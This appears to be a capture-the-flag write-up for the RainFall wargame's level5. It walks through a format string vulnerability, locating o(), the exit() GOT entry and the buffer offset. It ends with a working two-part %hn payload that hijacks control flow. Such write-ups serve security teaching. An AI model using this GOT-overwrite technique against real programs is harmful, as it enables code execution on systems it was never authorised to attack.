##	Description

In this level, we have a program that is quite similar to the previous one. The main calls the `n` function, which then gets user input from `stdin` via `fgets`. The buffer is directly printed using `printf` without any format string specified, leading to a format string vulnerability again.

Here instead of changing the value of a variable, we have to load an address to force the instructions to execute a function o() that is otherwise unreachable (dead-code), a classic GOT overwrite.

```bash
level5@RainFall:~$ objdump --syms level5 

level5:     file format elf32-i386

SYMBOL TABLE:
...
080484a4 g     F .text  0000001e              o
08049854 g     O .bss   00000004              m
08049848 g       *ABS*  00000000              __bss_start
08048504 g     F .text  0000000d              main
00000000  w      *UND*  00000000              _Jv_RegisterClasses
08048334 g     F .init  00000000              _init
```

The function is located at `080484a4`, so this is our address to inject.

```bash
level5@RainFall:~$ gdb -batch level5 -ex 'disas n'
Dump of assembler code for function n:
...
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

This is the PLT stub that jumps to the GOT table containing the real location of the exit() function:

```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit
```

We know that the offset in the buffer is the fourth memory location:

```bash
level5@RainFall:~$ ./level5 
AAAA.%p.%p.%p.%p.%p.%p
AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025
								         ^^^^^^^^^^
```

So for this level, we need to exploit the format string vulnerability by injecting the address of the function `o()` in the GOT table so that when the program will call `exit()`, it will call `o()` instead.

The payload for printf() needs to contain the address of exit@GOT first, but we have to split it in two since the write would need abut 16 millions chars for a single write. We can use the short type `%hn` instead:

```bash
level5@RainFall:~$ python -c 'print(
"\x3a\x98\x04\x08" +
"\x38\x98\x04\x08" +
"%2044x" +
"%4$hn" +
"%31904x" +
"%5$hn"
)' > /tmp/level5
level5@RainFall:~$ cat /tmp/level5 - | ./level5
```

The trick here is to manage the quantity of bytes written in each of the two addresses: first write 2052 (0x0804) bytes in the higher part, then 33956 (0x84a4) in the lower. Each write already uses 4 bytes for the address itself, so we write 2044 and 31904 instead.
